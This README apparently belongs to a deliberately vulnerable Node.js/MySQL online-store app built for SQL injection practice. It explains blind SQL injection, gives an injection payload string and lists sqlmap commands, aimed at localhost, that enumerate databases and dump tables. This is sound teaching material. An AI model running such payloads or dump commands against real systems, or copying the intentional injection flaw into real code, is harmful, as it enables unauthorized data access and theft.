# Vulnerability testign

## About this system domain

Welcome to our online store platform, designed to help you sell your products with ease! Our software is an all-in-one solution that simplifies the process of managing your online store. Our objective is to provide you with a platform that allows you to sell your products online while managing your data, credit cards, orders, and products with ease.

Our software is built to provide you with everything you need to run your online store. Whether you're a small business owner or a large corporation, our platform offers the tools and features you need to create, manage, and grow your online store. You can create advertisements, manage every purchase and order you receive, and easily track your inventory with our intuitive dashboard.

We believe that selling things online should be easy and accessible to everyone, which is why we've created a platform that is both user-friendly and powerful. With our software, you can focus on what you do best – creating great products – while we take care of the rest. Join us today and start selling your products online with ease!

## Technologies Used
- [Node.js](https://nodejs.org/en)
- [Express](https://expressjs.com/pt-br/)
- [MySQL](https://www.mysql.com/)
- [Pug](https://pugjs.org/api/getting-started.html)
- [Knex](https://knexjs.org/)
- [Passport (Username + password Strategy)](https://www.passportjs.org/tutorials/password/)

## How to run this project
```bash
# have an instance of mysql running and change '/infra/db/connection.js'
# to access this instance
# and then you can execute the project with:
$ npm install
$ npm run migrate
$ npm run seed
$ npm run dev # can use npm run docker or npm start, also.
# an alternative is:
$ docker-compose up
```

## Scanning for vulnerabilities
Blind SQL injections (blind SQLi) occur when a web application is exposed to SQL injection, but its 
HTTP responses don’t contain the results of the SQL query or any details of database errors.

In a Blind SQL Injection, attackers never see the output of the SQL queries. Still, they may see if 
the application or web page loads normally, and discern how long the SQL server needs to process the 
SQL query that an attacker passed in the user input.[¹](#references)

In the next links, you may find interesting information about vulnerability testing and some tricks 
that will help you to defend your applications against attacks:
- [Boolean-based blind test](https://beaglesecurity.com/blog/vulnerability/boolean-based-blind-sql-injection.html)
- [SQLi Cheat-Sheet](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet)

Simple demonstration of the error: `?product=") OR "1"="1" OR "1" like ("`

### SQLMap
[Kali tools - SQLMap](https://www.kali.org/tools/sqlmap/)

#### Install it

```bash
$ sudo apt install sqlmap
```

#### Use it

```bash
# List databases
$ sqlmap -u "http://localhost:8080/products?sortBy=1" --dbs

# List tables
$ sqlmap -u "http://localhost:8080/products?sortBy=1" -D <db_name> --tables

# List columns
$ sqlmap -u "http://localhost:8080/products?sortBy=1" --col
# or for one table:
$ sqlmap -u "http://localhost:8080/products?sortBy=1" -D <db_name> -T <table_name> --col

# Dump table data 
$ sqlmap -u "http://localhost:8080/products?sortBy=1" -D <db_name> -T <table_name> --dump
```

## References
 1. [What is blind sqli?](https://brightsec.com/blog/blind-sql-injection/)

## License
This project is licensed under the MIT License - see the LICENSE file for details.
